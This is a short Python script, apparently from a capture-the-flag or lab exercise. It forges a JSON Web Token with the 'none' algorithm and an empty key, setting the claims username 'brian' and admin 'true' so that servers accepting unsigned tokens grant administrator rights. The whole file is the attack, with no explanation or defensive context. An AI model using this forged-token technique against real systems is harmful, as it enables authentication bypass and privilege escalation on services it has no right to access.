import jwt
username = 'brian'
admin_flag = 'true'
algo = 'none'
encoded = jwt.encode({'username':username,'admin':admin_flag},'',algorithm=algo)
print(encoded)
